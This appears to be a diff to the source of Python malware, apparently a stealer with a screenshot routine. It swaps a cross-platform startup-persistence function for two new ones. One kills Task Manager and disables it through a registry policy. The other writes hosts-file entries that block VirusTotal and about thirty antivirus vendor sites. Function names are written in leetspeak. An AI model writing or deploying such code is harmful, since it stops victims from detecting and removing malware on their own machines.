@@ -1178,27 +1178,68 @@ def Scr33n5h0t():
     except:
         pass
 
-def St4rtup():
+def B10ck_T45k_M4n4g3r():
+    "Perm Admin Required"
+    for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'] == 'Taskmgr.exe':
+            proc.terminate()
+            break
+    subprocess.run("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
+    Clear()
+
+def B10ck_W3b5it3():
+    "Perm Admin Required"
     try:
-        file_path = os.path.abspath(sys.argv[0])
+        d1r3ct0ry = os.getcwd()
+        d15k_l3tt3r = os.path.splitdrive(d1r3ct0ry)[0]
 
-        if file_path.endswith(".exe"):
-            ext = "exe"
-        elif file_path.endswith(".py"):
-            ext = "py"
+        def b10ck_w3b5it3(website):
+            hosts_path = f"{d15k_l3tt3r}\\Windows\\System32\\drivers\\etc\\hosts"
+            if os.path.exists(hosts_path):
+                pass
+            else:
+                hosts_path = f"C:\\Windows\\System32\\drivers\\etc\\hosts"
 
-        new_name = f"ㅤ.{ext}"
+            redirect = "127.0.0.1"
+            with open(hosts_path, "a") as file:
+                file.write("\n" + redirect + " " + website)
+        
+        w3b51t35_t0_8l0ck = [
+            'virustotal.com', 
+            'www.virustotal.com',
+            'www.virustotal.com/gui/home/upload',
+            'avast.com', 
+            'totalav.com', 
+            'scanguard.com', 
+            'totaladblock.com', 
+            'pcprotect.com', 
+            'mcafee.com', 
+            'bitdefender.com', 
+            'us.norton.com', 
+            'avg.com', 
+            'malwarebytes.com', 
+            'pandasecurity.com', 
+            'avira.com', 
+            'norton.com', 
+            'eset.com', 
+            'zillya.com', 
+            'kaspersky.com', 
+            'usa.kaspersky.com', 
+            'sophos.com', 
+            'home.sophos.com', 
+            'adaware.com', 
+            'bullguard.com', 
+            'clamav.net', 
+            'drweb.com', 
+            'emsisoft.com', 
+            'f-secure.com', 
+            'zonealarm.com', 
+            'trendmicro.com', 
+            'ccleaner.com'
+        ]
 
-        if sys.platform.startswith('win'):  
-            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-        elif sys.platform.startswith('darwin'): 
-            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
-        elif sys.platform.startswith('linux'):
-            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
-        path_new_file = os.path.join(folder, new_name)
-
-        shutil.copy(file_path, path_new_file)
-        os.chmod(path_new_file, 0o777) 
+        for w3b51t3 in w3b51t35_t0_8l0ck:
+            b10ck_w3b5it3(w3b51t3)
     except:
         pass
 
